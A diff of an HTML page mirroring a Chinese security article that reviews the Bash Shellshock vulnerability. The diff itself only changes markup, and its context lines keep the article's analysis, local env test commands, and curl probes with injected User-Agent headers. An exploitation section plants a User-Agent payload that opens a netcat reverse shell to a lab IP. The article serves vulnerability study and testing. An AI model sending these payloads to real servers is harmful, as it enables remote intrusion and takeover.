@@ -3,16 +3,16 @@
 			<head>
 			     <title>Shellshock漏洞回顾与分析测试 - Debug_Orz</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/3268">http://drops.wooyun.org/papers/3268</a></h1>
 				
       <p>
-        <p><img src="http://static.wooyun.org/20141021/2014102105213352464.jpg" alt="enter image description here" /></p>
+        </p><p><img src="http://static.wooyun.org/20141021/2014102105213352464.jpg" alt="enter image description here"></p>
 
 <h2>0x00 漏洞概述</h2>
 
-<hr />
+<hr>
 
 <p>很多人或许对2014上半年发生的安全问题“心脏流血”（Heartbleed Bug）事件记忆颇深，2014年9月，又出现了另外一个“毁灭级”的漏洞——Bash软件安全漏洞。这个漏洞由法国GNU/Linux爱好者Stéphane Chazelas所发现。随后，美国电脑应急响应中心（US-CERT）、红帽以及多家从事安全的公司于周三（北京时间2014年9月24日）发出警告。</p>
 
@@ -104,11 +104,11 @@ curl -H 'User-Agent:() { :; }; echo -e "\r\nVul\r\n"' http://example.com/some-cg
 
 <p>下面引用一张图，做个简单的形象说明。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213635093.jpg" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213635093.jpg" alt="enter image description here"></p>
 
 <h2>0x01 漏洞原因分析</h2>
 
-<hr />
+<hr>
 
 <p>漏洞信息最早来源于国外知名漏洞网站exploit-db下的第34765篇漏洞报告，其中出现了一条验证命令：</p>
 
@@ -126,11 +126,11 @@ Vulnerable this is a test
 
 <p>Windows Cygwin Terminal本地执行结果如下：</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213639960.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213639960.png" alt="enter image description here"></p>
 
 <p>Kali 1.0.9-i386本地执行结果如下：</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213720953.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213720953.png" alt="enter image description here"></p>
 
 <p>CVE-2014-6271中的bug修复后，问题马上就解决了，大多数厂商都及时提供了修复后的Bash版本。面向互联网的服务器没有理由不马上修复它，因为这个漏洞会使主机完全落入别人的控制（以Apache所使用的用户身份）中。 但是，大家的目光已经聚焦在这个领域，新的bug被发现了。同时使用Bash的shell重定向功能和函数自动导入功能，CVE-2014-7169出现了。这回导致的结果是可以随意读写远程机器上的文件，使用的手段和上次一样，只不过这次是利用了shell的重定向符号&lt;或>。</p>
 
@@ -182,7 +182,7 @@ Hello
 
 <p>上述语句在Cygwin Terminal环境下的测试结果如下。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213796349.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213796349.png" alt="enter image description here"></p>
 
 <p>使用下面语句定义后，查看环境变量，可以发现刚才定义的值</p>
 
@@ -190,7 +190,7 @@ Hello
 export X='() { echo "inside X"; }; echo "outside X";'
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213743008.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213743008.png" alt="enter image description here"></p>
 
 <p>下面对Bash独特的定义方式进行测试，因为这种独特的方法只会在shell启动的时候生效，所以大多数用来演示这个漏洞的示例代码都只有一行：</p>
 
@@ -200,7 +200,7 @@ env HELLO="() { echo 'Hello'; }" bash -c HELLO
 
 <p>这行代码的作用跟下面分步执行的语句，在效果上是一样的。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213733672.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213733672.png" alt="enter image description here"></p>
 
 <p>env命令代表“先设置下面的环境变量，再运行下面的程序”，并且执行完成后当前的环境变量不受影响。实际上，直接写成</p>
 
@@ -218,7 +218,7 @@ env HELLO="() { echo 'Hello'; }" bash -c HELLO
 env HELLO="() { echo 'Hello'; }" bash -c HELLO
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213885947.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213885947.png" alt="enter image description here"></p>
 
 <p><strong>1.2 异常执行过程分析</strong></p>
 
@@ -228,7 +228,7 @@ env HELLO="() { echo 'Hello'; }" bash -c HELLO
 
 <p>恶意命令被添加在合法环境变量之后，Bash会首先运行恶意命令，异常执行结构图示如下：</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213816424.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213816424.png" alt="enter image description here"></p>
 
 <p>Shellshock command diagram (Symantec)</p>
 
@@ -242,11 +242,11 @@ env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
 
 <p>打个比方，本来正常要执行的是“牛A”和“牛C”，结果中间的“牛B”被执行了</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213882515.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213882515.png" alt="enter image description here"></p>
 
 <p>Bash漏洞在于函数体外面的代码被默认地执行了，执行结果如下所示。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213892135.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213892135.png" alt="enter image description here"></p>
 
 <p>问题出现在bash解析完函数定义，执行函数的时候，它自动导入函数的解析器越过了函数定义的结尾，接着执行后面的代码，并且由于每一个新的bash启动时都会触发这个漏洞，相当于任意代码都能被执行了。</p>
 
@@ -269,7 +269,7 @@ env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
 
 <h2>0x02 影响范围分析</h2>
 
-<hr />
+<hr>
 
 <p>对于存在Bash漏洞系统而言，由于它允许未经授权的远程用户可以指定Bash环境变量，那么运行这些服务或应用程序的系统，就存在漏洞被利用的可能。</p>
 
@@ -295,7 +295,7 @@ env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
 
 <h2>0x03 漏洞验证测试</h2>
 
-<hr />
+<hr>
 
 <p><strong>3.1 不同工具测试比较</strong></p>
 
@@ -303,27 +303,27 @@ env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
 
 <p>工具1 利用Crow Strike ShellShock Scanner测试Bash漏洞，该工具可以批量扫描，测试某网站结果如下：</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213923772.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213923772.png" alt="enter image description here"></p>
 
 <p>为了分析该工具的测试字符，利用Wireshark抓包，发现该工具主要测试了3个字段Test、Cookie、Referer，抓包结果如下：</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213958216.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213958216.png" alt="enter image description here"></p>
 
 <p>工具2</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213971322.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213971322.png" alt="enter image description here"></p>
 
 <p>工具3</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105213972340.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105213972340.png" alt="enter image description here"></p>
 
 <p><strong>3.2 本地测试</strong></p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214082374.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214082374.png" alt="enter image description here"></p>
 
 <p>本地构造不同的POC，进行Bash漏洞测试，如果我们打开Cygwin Terminal，使用不同的测试用例，进行测试，在Cygwin Terminal下的测试结果如下：</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214026752.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214026752.png" alt="enter image description here"></p>
 
 <p><strong>3.3 远程测试</strong></p>
 
@@ -337,31 +337,31 @@ curl -H 'User-Agent:() { :; }; echo -e "\r\nVul\r\n"'  http://XXX:8080/cgi-bin/X
 
 <p>测试截图如下：</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214059733.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214059733.png" alt="enter image description here"></p>
 
 <p>在http协议中构造<code>Referer</code>、<code>Cookie</code>、<code>User-Agent</code>字段命令，使用Burpsuit，发送到存在Bash漏洞的服务器，会返回3个Vul字符，说明3个字段传递的参数都被服务器后端脚本解析处理，测试结果如下：</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214077988.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214077988.png" alt="enter image description here"></p>
 
 <p>构造其他Poc，获取服务器用户名和密码。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214156017.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214156017.png" alt="enter image description here"></p>
 
 <h2>0x04 漏洞利用测试</h2>
 
-<hr />
+<hr>
 
 <p>在本地搭建有Bash漏洞的服务器，利用浏览器访问CGI页面，显示正常访问。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214287597.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214287597.png" alt="enter image description here"></p>
 
 <p>用Burpsuit进行拦截，初始时<code>intercept is off</code>。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214271974.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214271974.png" alt="enter image description here"></p>
 
 <p>用Burpsuit进行拦截，打开<code>intercept is on</code>。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214386252.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214386252.png" alt="enter image description here"></p>
 
 <p>修改http协议中的User-Agent字段为</p>
 
@@ -369,15 +369,15 @@ curl -H 'User-Agent:() { :; }; echo -e "\r\nVul\r\n"'  http://XXX:8080/cgi-bin/X
 () { :; }; /bin/bash -c "nc 192.168.175.142 4444 -e /bin/bash -i"
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214348172.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214348172.png" alt="enter image description here"></p>
 
 <p>发送http请求后，nc反弹，可以查看用户名、目录、系统版本等信息。</p>
 
-<p><img src="http://static.wooyun.org/20141021/2014102105214497405.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141021/2014102105214497405.png" alt="enter image description here"></p>
 
 <h2>0x05 参考文献</h2>
 
-<hr />
+<hr>
 
 <blockquote>
   <p>1) http://www.freebuf.com/vuls/44994.html</p>
@@ -523,7 +523,7 @@ curl -H 'User-Agent:() { :; }; echo -e "\r\nVul\r\n"'  http://XXX:8080/cgi-bin/X
   <p>71) http://pastebin.com/mG1grQwK</p>
   
   <p>72) http://www.cyactive.com/shellshock-blasts-supermassive-black-hole-heart-cyber-space/</p>
-</blockquote>      </p>
+</blockquote>      <p></p>
     
 			</body>
 		</html>
